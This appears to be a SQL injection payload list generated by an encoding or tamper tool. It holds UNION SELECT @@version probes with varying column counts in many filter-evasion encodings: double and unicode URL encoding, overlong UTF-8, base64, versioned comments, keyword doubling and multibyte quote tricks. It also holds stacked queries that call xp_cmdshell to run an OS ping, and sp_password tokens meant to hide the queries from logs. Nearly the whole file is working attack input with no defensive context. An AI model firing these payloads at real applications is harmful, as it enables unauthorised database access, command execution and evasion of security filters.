# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
%00
IyB5b3Ugd2lsbCBuZWVkIHRvIGN1c3RvbWl6ZS9tb2RpZnkgc29tZSBvZiB0aGUgdmF1bGVzIGluIHRoZSBxdWVyaWVzIGZvciBiZXN0IGVmZmVjdAo=
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%2523%2520%2579%256F%2575%2520%2577%2569%256C%256C%2520%256E%2565%2565%2564%2520%2574%256F%2520%2563%2575%2573%2574%256F%256D%2569%257A%2565%252F%256D%256F%2564%2569%2566%2579%2520%2573%256F%256D%2565%2520%256F%2566%2520%2574%2568%2565%2520%2576%2561%2575%256C%2565%2573%2520%2569%256E%2520%2574%2568%2565%2520%2571%2575%2565%2572%2569%2565%2573%2520%2566%256F%2572%2520%2562%2565%2573%2574%2520%2565%2566%2566%2565%2563%2574%250A
%23%20%79%6F%75%20%77%69%6C%6C%20%6E%65%65%64%20%74%6F%20%63%75%73%74%6F%6D%69%7A%65%2F%6D%6F%64%69%66%79%20%73%6F%6D%65%20%6F%66%20%74%68%65%20%76%61%75%6C%65%73%20%69%6E%20%74%68%65%20%71%75%65%72%69%65%73%20%66%6F%72%20%62%65%73%74%20%65%66%66%65%63%74%0A
%u0023%u0020%u0079%u006F%u0075%u0020%u0077%u0069%u006C%u006C%u0020%u006E%u0065%u0065%u0064%u0020%u0074%u006F%u0020%u0063%u0075%u0073%u0074%u006F%u006D%u0069%u007A%u0065%u002F%u006D%u006F%u0064%u0069%u0066%u0079%u0020%u0073%u006F%u006D%u0065%u0020%u006F%u0066%u0020%u0074%u0068%u0065%u0020%u0076%u0061%u0075%u006C%u0065%u0073%u0020%u0069%u006E%u0020%u0074%u0068%u0065%u0020%u0071%u0075%u0065%u0072%u0069%u0065%u0073%u0020%u0066%u006F%u0072%u0020%u0062%u0065%u0073%u0074%u0020%u0065%u0066%u0066%u0065%u0063%u0074%u000A
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%C0%AB%C0%AAyou%C0%AAwill%C0%AAneed%C0%AAto%C0%AAcustomize%C0%AFmodify%C0%AAsome%C0%AAof%C0%AAthe%C0%AAvaules%C0%AAin%C0%AAthe%C0%AAqueries%C0%AAfor%C0%AAbest%C0%AAeffect%C0%8A
%# %y%o%u %w%i%l%l %n%e%e%d %t%o %c%u%s%t%o%m%i%z%e%/%m%o%d%i%f%y %s%o%m%e %o%f %t%h%e %v%a%u%l%e%s %i%n %t%h%e %q%u%e%r%i%e%s %f%o%r %b%e%s%t %e%f%f%e%c%t%

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
 and '0having'='0having'
# you will need to customize/modify some of the vaules in the queries for best effect
sp_password
#/**/you/**/will/**/need/**/to/**/customize/modify/**/some/**/of/**/the/**/vaules/**/in/**/the/**/queries/**/for/**/best/**/effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%01you%02will%0Dneed%08to%09customize/modify%0Csome%09of%0Athe%0Fvaules%0Din%04the%05queries%0Cfor%03best%01effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%0Cyou%0Cwill%0Cneed%0Cto%09customize/modify%0Csome%0Dof%0Dthe%0Bvaules%0Din%0Bthe%0Aqueries%0Bfor%0Bbest%0Beffect

# you will need to customize/modify some of the vaules in the queries for best effect

#+you+will+need+to+customize/modify+some+of+the+vaules+in+the+queries+for+best+effect

#%09you%0Awill%0Dneed%09to%0Acustomize/modify%0Csome%09of%0Dthe%0Cvaules%0Cin%0Athe%09queries%0Dfor%0Cbest%09effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%EF%BC%87; exec master..xp_cmdshell %EF%BC%87ping 10.10.1.2%EF%BC%87--

%00%27; exec master..xp_cmdshell %00%27ping 10.10.1.2%00%27--

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

' /*!30558union (select NULL, NULL, NULL,  (select @@version)) */--

' /*!00000union (select NULL, NULL, NULL,  (select @@version)) */--

' union (select NULL, NULL, NULL,  (select @@version)) --

' UNIUNIONON (SESELECTLECT NULL, NULL, NULL,  (SESELECTLECT @@version)) --

%C0%AF%C0%AAunion%C0%AA%C0%AAselect%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AA%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AB%C0%AA%C0%AF%C0%AF%C0%8A
%' %u%n%i%o%n %(%s%e%l%e%c%t %N%U%L%L%, %N%U%L%L%, %N%U%L%L%,  %(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%) %-%-%

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --
 and '0having'='0having'
' union (select NULL, NULL, NULL,  (select @@version)) --
-- sp_password
'/**/union/**/(select/**/NULL,/**/NULL,/**/NULL,/**//**/(select/**/@@version))/**/--

'--uZxWMaw%0Aunion--dZYsMynKli%0A(select--nnGUbqwle%0ANULL,--pQCUbHhYGU%0ANULL,--dVLGEAuaFh%0ANULL,--LvtWwa%0A--fFoybU%0A(select--ZfDUJOLc%0A@@version))--xSjqGNqSuZ%0A----aZmzTCsxz%0A
'%23kcyYnuyKu%0Aunion%23fYywcI%0A(select%23gRHWXv%0ANULL,%23NHxCAMbqTlF%0ANULL,%23mTGQZfhA%0ANULL,%23iJhmfpPK%0A%23GuMGVv%0A(select%23PJiAgG%0A@@version))%23zoUbjdpIWxa%0A--%23DgorZtsLFkXz%0A
'%23uWiZMoOPBFL%0Aunion%23eJPDHsbycy%0A(select%23eabNQEDRr%0ANULL,%23bRVitTDkIIoI%0ANULL,%23kpNYQmjXIdL%0ANULL,%23BsMbYVCrUY%0A%23neFWSYcc%0A(select%23NtXhoju%0A@@version))%23OxyrGSj%0A--%23XQIXCO%0A
'%0Dunion%05(select%0BNULL,%04NULL,%05NULL,%0C%08(select%02@@version))%03--

'%23%0Aunion%23%0A(select%23%0ANULL,%23%0ANULL,%23%0ANULL,%23%0A%23%0A(select%23%0A@@version))%23%0A--%23%0A
'%0Cunion%0C(select%0BNULL,%0DNULL,%0ANULL,%0B%0D(select%0D@@version))%09--

'--%0Aunion--%0A(select--%0ANULL,--%0ANULL,--%0ANULL,--%0A--%0A(select--%0A@@version))--%0A----%0A
'+union+(select+NULL,+NULL,+NULL,++(select+@@version))+--

'%09union%0C(select%0ANULL,%0DNULL,%0DNULL,%0D%0D(select%09@@version))%0C--

' union (select NULL, NULL, NULL,  (select @@version)) --

%bf%27 union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL,  (select @@version)) --

%EF%BC%87 union (select NULL, NULL, NULL, NULL,  (select @@version)) --

%00%27 union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
%00
JyB1bmlvbiAoc2VsZWN0IE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsICAoc2VsZWN0IEBAdmVyc2lvbikpIC0tCg==
' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

%2527%2520%2575%256E%2569%256F%256E%2520%2528%2573%2565%256C%2565%2563%2574%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%2520%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%2529%2520%252D%252D%250A
%27%20%75%6E%69%6F%6E%20%28%73%65%6C%65%63%74%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%20%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%29%20%2D%2D%0A
%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u0029%u0020%u002D%u002D%u000A
' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' /*!30395union (select NULL, NULL, NULL, NULL,  (select @@version)) */--

' /*!00000union (select NULL, NULL, NULL, NULL,  (select @@version)) */--

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' UUNIONNION (SSELECTELECT NULL, NULL, NULL, NULL,  (SSELECTELECT @@version)) --

%C0%AF%C0%AAunion%C0%AA%C0%AAselect%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AA%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AB%C0%AA%C0%AF%C0%AF%C0%8A
%' %u%n%i%o%n %(%s%e%l%e%c%t %N%U%L%L%, %N%U%L%L%, %N%U%L%L%, %N%U%L%L%,  %(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%) %-%-%

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
 and '0having'='0having'
' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
-- sp_password
'/**/union/**/(select/**/NULL,/**/NULL,/**/NULL,/**/NULL,/**//**/(select/**/@@version))/**/--

'--NLFIUlrQE%0Aunion--buwuHPn%0A(select--nIjWghpJP%0ANULL,--WpzUnfvrJyIp%0ANULL,--yINdlMRxNLV%0ANULL,--nnWejhik%0ANULL,--EUdJya%0A--crrLtpwJ%0A(select--fFlGwbgM%0A@@version))--GwaxWSUdD%0A----NhuofKUfCiN%0A
'%23dhuRampaRF%0Aunion%23IWyFhApdwXj%0A(select%23ofBQvHsw%0ANULL,%23cEaOCgFA%0ANULL,%23JVbJLGVQwNf%0ANULL,%23mnHXkRJJ%0ANULL,%23mIoGgRtBouM%0A%23DRHyEt%0A(select%23IMivXxd%0A@@version))%23pnHwWP%0A--%23mtbwlZGgI%0A
'%23qmkpugpnI%0Aunion%23ZqCPGsxCSqr%0A(select%23nIuLWXlXxM%0ANULL,%23MsHoynomKdP%0ANULL,%23MWRmzT%0ANULL,%23UwBCorvgcQ%0ANULL,%23HiEPtryGVw%0A%23HEyVjVWTiu%0A(select%23NWYnJu%0A@@version))%23EVUNkYlvAji%0A--%23IVkiWYcVSxcs%0A
'%0Bunion%0A(select%08NULL,%05NULL,%0FNULL,%0DNULL,%07%0D(select%03@@version))%04--

'%23%0Aunion%23%0A(select%23%0ANULL,%23%0ANULL,%23%0ANULL,%23%0ANULL,%23%0A%23%0A(select%23%0A@@version))%23%0A--%23%0A
'%0Bunion%0D(select%0ANULL,%0CNULL,%0ANULL,%0DNULL,%0C%0D(select%0D@@version))%09--

'--%0Aunion--%0A(select--%0ANULL,--%0ANULL,--%0ANULL,--%0ANULL,--%0A--%0A(select--%0A@@version))--%0A----%0A
'+union+(select+NULL,+NULL,+NULL,+NULL,++(select+@@version))+--

'%09union%09(select%0ANULL,%0DNULL,%0ANULL,%0ANULL,%0D%0C(select%0C@@version))%0C--

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

%bf%27 union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  (select @@version)) --

%EF%BC%87 union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

%00%27 union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
%00
JyB1bmlvbiAoc2VsZWN0IE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsICBOVUxMLCAoc2VsZWN0IEBAdmVyc2lvbikpIC0tCg==
' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

%2527%2520%2575%256E%2569%256F%256E%2520%2528%2573%2565%256C%2565%2563%2574%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%254E%2555%254C%254C%252C%2520%2520%254E%2555%254C%254C%252C%2520%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%2529%2520%252D%252D%250A
%27%20%75%6E%69%6F%6E%20%28%73%65%6C%65%63%74%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%20%4E%55%4C%4C%2C%20%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%29%20%2D%2D%0A
%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u0020%u004E%u0055%u004C%u004C%u002C%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u0029%u0020%u002D%u002D%u000A
' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' /*!30914union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) */--

' /*!00000union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) */--

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' UUNIONNION (SELSELECTECT NULL, NULL, NULL, NULL,  NULL, (SELSELECTECT @@version)) --

%C0%AF%C0%AAunion%C0%AA%C0%AAselect%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AANULL%C0%AE%C0%AA%C0%AANULL%C0%AE%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AB%C0%AA%C0%AF%C0%AF%C0%8A
%' %u%n%i%o%n %(%s%e%l%e%c%t %N%U%L%L%, %N%U%L%L%, %N%U%L%L%, %N%U%L%L%,  %N%U%L%L%, %(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%) %-%-%

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
 and '0having'='0having'
' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
-- sp_password
'/**/union/**/(select/**/NULL,/**/NULL,/**/NULL,/**/NULL,/**//**/NULL,/**/(select/**/@@version))/**/--

'--qRkkghmFl%0Aunion--SGUphZZy%0A(select--qMwFNVmgk%0ANULL,--QcCICsr%0ANULL,--ztzfgXNvYLJ%0ANULL,--KqSNabvpimRe%0ANULL,--UCAmFWyrSyL%0A--IkelrrVC%0ANULL,--ykitaaoQn%0A(select--rYiQgQdNL%0A@@version))--DGoixVjI%0A----gtcpZgMWg%0A
'%23lgdPzMLFb%0Aunion%23NHcGPYS%0A(select%23FrTQMpOnregO%0ANULL,%23LIWfOojAEGg%0ANULL,%23xMHisBVOOM%0ANULL,%23uxZJuODuTIIn%0ANULL,%23dVaojlqhev%0A%23OFOZxIPp%0ANULL,%23MPNGNTc%0A(select%23kIOFXe%0A@@version))%23PBMDsy%0A--%23ROSCCZcd%0A
'%23sJfckgQQ%0Aunion%23EdfvJgW%0A(select%23kHJUuvwKh%0ANULL,%23tgeZTKs%0ANULL,%23EeaZnCgA%0ANULL,%23LYBhdsAZ%0ANULL,%23DbiHOOnyRnNz%0A%23FTlEyE%0ANULL,%23ckzzEGsRV%0A(select%23kDWMlgdGyaQm%0A@@version))%23FtWhowZoD%0A--%23yHaBELoQK%0A
'%0Dunion%09(select%05NULL,%0ANULL,%08NULL,%03NULL,%01%04NULL,%03(select%0A@@version))%01--

'%23%0Aunion%23%0A(select%23%0ANULL,%23%0ANULL,%23%0ANULL,%23%0ANULL,%23%0A%23%0ANULL,%23%0A(select%23%0A@@version))%23%0A--%23%0A
'%0Dunion%0B(select%0BNULL,%0BNULL,%0DNULL,%09NULL,%0B%0BNULL,%09(select%0A@@version))%09--

'--%0Aunion--%0A(select--%0ANULL,--%0ANULL,--%0ANULL,--%0ANULL,--%0A--%0ANULL,--%0A(select--%0A@@version))--%0A----%0A
'+union+(select+NULL,+NULL,+NULL,+NULL,++NULL,+(select+@@version))+--

'%0Cunion%0A(select%0DNULL,%09NULL,%0DNULL,%0ANULL,%0C%0DNULL,%0D(select%0D@@version))%09--

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

%bf%27 union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --

